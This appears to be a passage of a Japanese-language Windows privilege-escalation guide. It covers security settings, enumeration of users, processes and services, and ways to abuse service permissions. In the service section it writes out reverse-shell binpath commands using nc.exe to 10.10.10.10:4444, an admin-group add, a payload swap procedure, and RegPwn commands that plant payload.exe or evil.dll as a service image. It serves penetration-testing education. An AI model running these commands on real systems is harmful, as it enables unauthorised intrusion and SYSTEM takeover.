この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus and Detectors

### 監査設定

これらの設定によって何が**ログに記録される**かが決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログがどこに送信されるのかを把握しておくとよいでしょう。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分なアクセス許可を付与されたユーザーのみがアクセスできます。これにより、認可されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文のパスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護機能を導入し、信頼されていないプロセスによる**メモリの読み取り**やコードのインジェクションを**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することを目的としています。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって使用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに興味深い権限がないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、それを悪用して権限昇格する方法についてはこちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token の操作

このページで**token**とは何かについて**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで**興味深い token**とその悪用方法について学びましょう:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示し、**プロセスのコマンドラインにパスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるか確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を実行できる可能性を探ります。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。権限昇格に悪用できる可能性があります。

debuggerの待ち受けは短時間で終了することがあるため、受動的なポートスナップショットで確認できなかったからといって、公開されたことがないとは限りません。確認した待ち受けについて、PID、プロセスの所有者、権限の低いユーザーから到達できるかを照合してください。アプリケーション名やdebugフラグだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙は受動的な方法にとどめ、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが存在するフォルダーのアクセス許可を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort の dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルに宣言された `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクまたはサービスについて調べる場合は、その設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。その場所に自分の token でファイルを作成できる場合、そのタスクまたはサービスが次にモジュールを読み込む際の code execution につながる可能性があるため、調査対象となります。実行アカウントの実効権限、アクティブな設定、モジュールの互換性、拒否設定や共有制限を確認してください。ディレクトリが書き込み可能なだけでは、権限昇格が成立するとは限りません。[Snort の dynamic preprocessor のドキュメント](https://www.snort.org/documents/dpx-readme)では、実行時のモジュール読み込みについて説明されています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストール環境では、サービスの実行ファイルのパスと実行アカウントを、アクティブな `httpd.conf` にある `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている状態で、低権限ユーザーがそのルートにファイルを作成できる場合、サーバー側の code execution によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、正確なパスが公開されていること、そのファイル形式がサーバー側のハンドラーで処理されることを確認してください。ルートが書き込み可能なだけでは、ファイルを作成できることしか証明できません。ファイルを書き込まずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP のインストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit のレイアウトでは `C:\wamp\...`）を指し、その隣の `conf\httpd.conf` に設定があり、デフォルトのルートが `C:\wamp64\www` または `C:\wamp\www` になっている場合があります。サービスの正確なイメージ、実行アカウント、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host による上書きを含む）、およびルートの ACL を併せて確認してください。WAMP ディレクトリが書き込み可能でも、Apache が `SYSTEM` として実行されることや、投入したファイルを実行することの証明にはなりません。[Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、`applicationHost.config` 内で書き込み可能な物理ディレクトリを**稼働中のサイト／アプリケーション**に対応付け、その設定済みプールとサーバー側 handler を特定してください。配信ディレクトリに置いたコードがプールの ID で実行されるのは、IIS がそのファイル形式を処理し、対象の route に到達できる場合だけです。書き込み可能なディレクトリをコード実行と見なす前に、現在のユーザーが実効的にファイルを作成できるか、サイトが稼働中か、handler とパスごとの上書き設定はどうなっているかを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。デフォルトでは、該当する .NET Framework のインストール先の下にある `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` によって変更できます。[Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) および [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限の token が**特定の**アプリケーションの cache 内にある生成ソースを変更できる場合、そのアプリケーションがより高い権限の [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) でそれを再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。cache と稼働中のアプリケーション、実効 token と ACL、コンパイル設定、プロセス ID、および再コンパイルのタイミングを照合してください。読み取り専用のメタデータ確認にとどめ、列挙中にコンパイルを誘発したり、cache ファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS プールは、ローカルの token が低い権限であっても、一般にネットワークリソースに対して**ホストコンピューターのアカウント**として認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` のプールは、設定されたアカウントを使用します。[Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) および [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)。ID の設定が省略されている場合はプールのデフォルト設定が引き継がれることがあり、その内容は IIS の世代によって異なるため、プール名から推測せず実効設定を確認してください。コード実行がコンピューターアカウントのネットワーク ID を持つプールに到達する場合は、**その特定のコンピューター**が持つディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメインの naming context に対するレプリケーション権限が必要です。マシンアカウントの ticket やホストの役割だけでは、それらの権限があることの証明になりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証の実行、ticket の要求をせずに、設定と ACL を確認してください。

helper process を起動する、読み取り可能な ASP.NET handler については、request 由来の値が認証、復号、検証、コマンド構築の各段階をどう通過するかを追跡してください。復号した token を `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドを変更できる可能性があります。[Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない caller が復号後の値に実際に影響を与えられ、handler に到達できることを確認してから、実効的なアプリケーションプールまたは impersonation の ID と、子プロセスの ID を特定してください。ソースコードの一行、localhost の listener、または token 形式の弱点だけでは、特権コマンド実行の証明になりません。受動的な列挙では、偽造した request を送ったり helper を実行したりせずに、ソースとプール設定を確認してください。

Windows 上の PHP service では、request で制御可能なパスを [`include` or `require`](https://www.php.net/manual/en/function.include.php) に渡すことで、worker の ID で低権限ユーザーが書き込み可能な PHP ファイルを評価できる場合があります。request がその文に到達できること、解決されたパスが低権限ユーザーに変更可能で worker が読み取り可能なファイルを指していること、適用される PHP のパス制限が include を許可していること、そして worker が実際により高い権限で実行されていることを確認してください。loopback の listener や書き込み可能なファイルだけでは、この一連の条件がそろっている証明になりません。受動的な列挙では endpoint を呼び出さずに、ソース、service の ID、ファイル ACL を確認してください。

### メモリ上のパスワード探索

sysinternals の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などの service は**メモリ上に資格情報を平文で保持している**ため、メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 脆弱なGUIアプリ

**SYSTEMとして実行されるアプリケーションでは、ユーザーがCMDを起動したり、ディレクトリを閲覧したりできる場合があります。**

例: 「Windowsヘルプとサポート」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリック

### 特権コンテキストでのプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**実際の書き込み可能パス**、そのパスを開くプロセスまたはタスク、実効ID、パーサーのビルドを確認してください。[過去のGhidraプロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内のXML外部エンティティが許可されていました。Windows上のネットワークエンティティは、[送信SMBおよびNTLMポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可していれば、インポートアカウントによる認証を引き起こす可能性があります。これは認証情報漏えいにつながる手掛かりであり、直ちに管理者アクセスを得られるわけではありません。応答を利用するには、別の認可済みまたは脆弱な経路が必要です。また、現在のビルドについては実際のパッチ適用状況を確認してください。受動的な列挙中に細工したプロジェクトを開かないでください。インポートのワークフローとACLを確認してください。

## サービス

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE`権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager`アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりにすぎず、新しいサービスを実行できる証明にはなりません。[`CreateService`はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには作成時に要求したサービスアクセス権が付与されます。その後、サービスを再度開くと別途アクセスチェックが行われるため、元のハンドルを使用できる場合でも失敗することがあります。実効ローカルまたはリモートトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成したり、起動したりしないでください。

リモートからサービスをインストールする経路については、SCMの権限と、対象上で**同じネットワークログオン**が書き込み可能な共有、その基盤となるNTFS ACL、サービスアカウントが実行できるローカル実行ファイルのパスを照合してください。SCMの権限が異例に広く、ファイル配置の経路も存在する場合、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須ではありません。共有への書き込み権限だけ、あるいはSCMのサービス作成権限だけでは、新しいサービスをより高い権限で起動できるとは限りません。

既存のサービスは、ヘルパー実行ファイルが`ImagePath`に記載されていなくても、起動時、シャットダウン時、その他のライフサイクルイベント時にそのファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い権限で実行される場合、存在しないヘルパーファイルは条件付きの置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービスID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であること、あるいはファイルが存在しないことだけでは、サービスがそのファイルを読み込むとはいえません。受動的な調査ではサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START`により`StartService`へ引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは異なります。起動権限を単なる制御権以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービスID、引数から書き込みに至る正確な処理、パスの制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーが存在する場合に限られます。書き込み可能なログや起動権限だけでは不十分です。受動的なインベントリ調査では、サービスを起動したり、テストファイルを作成したりしないでください。

NSClient++監視エージェントでは、読み取り可能な`nsclient.ini`は**設定を確認する手掛かり**です。Web認証情報が含まれている可能性があり、`boot.ini`によって設定の参照先が別の場所に変更されている場合もあります。実際のサービスアカウント、WEBリスナーとアクセスポリシー、認証済みロールが設定またはスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または他の有効な実行経路）、コマンドの登録または変更に必要な実効権限、そのコマンドをサービスIDで実行するトリガーが必要です。ループバック専用のリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、リスナーだけでは、これらの権限があるとはいえません。受動的な調査では、秘密情報を表示したり、Web APIを呼び出したりせずに、メタデータと権限を確認してください。[NSClient++のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Webとスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath`が`nssm.exe`のサービスでは、サービスの実際の実行アカウントと、`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`の値を確認してください。[NSSMは子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory`は設定された作業ディレクトリです。ラッパーの権限だけでサービス境界全体を判断せず、子実行ファイルとその親ディレクトリのACLを確認してください。その子が公開するローカルWCFまたはSOAPエンドポイントは、別の調査の手掛かりです。低権限ユーザーからリスナーに到達できるか、対象の操作がそのユーザーの入力を受け付けるか、サービスの子プロセスがより高い権限で安全でない操作を実行するかを確認してください。サービスアカウント、エンドポイントURL、書き込み可能なパスだけでは権限昇格の証明にはなりません。受動的な調査中にサービス操作を呼び出さないでください。

カスタムWCF操作では、呼び出し元が制御する文字列がPowerShell runspaceに渡される経路を追跡してください。[`Pipeline.Commands.AddScript`はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。また、[`Pipeline.Invoke`はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windowsトランスポート認証を使用する`netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、**その特定の**操作を呼び出す権限とrunspaceの実効IDは、別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービスIDで実行される`AddScript`に至る経路は、コード実行の境界です。リスニングポート、認証済みクライアント、無関係なアセンブリ内の未使用メソッドだけでは証明になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装の設定を静的に確認してください。

Service Triggersを使用すると、特定の条件（名前付きパイプ／RPCエンドポイントのアクティビティ、ETWイベント、IPの利用可能状態、デバイスの接続、GPOの更新など）が発生したときにWindowsがサービスを起動できます。SERVICE_START権限がなくても、トリガーを発生させて特権サービスを起動できることがあります。列挙とトリガーの手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio診断コレクターサービス

C/C++ツールを含むVisual Studioのインストールには、`LocalSystem`として実行されるよう設定された診断サービス`VSStandardCollectorService150`が含まれている場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、ジャンクションとオブジェクトマネージャーリンクの競合を利用して、サービスのDACLリセット先をリダイレクトしました。実証された権限昇格には、利用可能なVisual Studio Setup WMI ProviderのMSI修復経路と、その`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`というターゲットも必要でした。このコンポーネントは2024年1月に修正されました。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを確認し、Setup WMI compilerのパスが存在するかを調べ、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studioの製品バージョン、コンパイラファイルのいずれかが存在するだけでは、ホストが脆弱とはいえません。確認のためにサービスを起動したり、修復を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

サービスに関する情報を取得するには**sc**を使用できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことをおすすめします。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」が何らかのサービスを変更できるか確認することをお勧めします:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生した場合（例: SSDPSRV）:

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。無効になっているか、有効なデバイスが関連付けられていません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost サービスが機能するには、SSDPSRV に依存していることに注意してください（XP SP1 の場合）**

**この問題の別の回避策**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスのバイナリパスを変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスの再起動

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、次のようなさまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス許可の再構成を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再構成を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていて、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる場合**、多くの場合、**バイナリを置き換えてサービスを再起動することで**サービスを乗っ取れます。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されている**フォルダーへの書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
**wmic**（system32 にはありません）を使用して、サービスによって実行されるすべてのバイナリを取得し、**icacls** でアクセス許可を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

自動チェックに便利なツール：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスによって通常ユーザーからの再起動が許可されていない場合は、起動時に自動で開始されるか、障害時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションを介して間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

変更可能なサービスレジストリがないか確認してください。\
次のようにして、サービスの**レジストリ**に対する**権限**を**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の permission test は次のように記載されていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認します。持っている場合、サービスによって実行される binary を変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認します。ACL エントリがあるだけでは、実効アクセスが証明されるわけではありません。拒否エントリ、現在の token、継承された権限も関係します。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス設定フィールド、サービスを起動する方法、より高い権限を持つサービス ID が必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行される binary の Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### レジストリ symlink race による任意の HKLM value write（ATConfig）

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。レジストリの **symbolic link race** を利用すると、この特権的な書き込み先を **任意の HKLM パス** にリダイレクトし、任意の HKLM **value write** を行うプリミティブを得られます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオン時やセキュア デスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）：

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュア デスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して**レースに勝ちます**。oplock が発動したら、**HKLM Session ATConfig** キーを、保護された HKLM のターゲットを指す **registry link** に置き換えます。
4. SYSTEM が、攻撃者の指定した値をリダイレクト先の HKLM パスに書き込みます。

任意の HKLM value write を得たら、サービス設定値を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE／コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注：** 公開されている exploit の実装では、この race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### サービスレジストリの AppendData/AddSubdirectory 権限

レジストリに対するこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、これは**任意のコードを実行するのに十分です**。

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 引用符で囲まれていないサービスパス

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでの各文字列を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします。

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて一覧表示します：

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
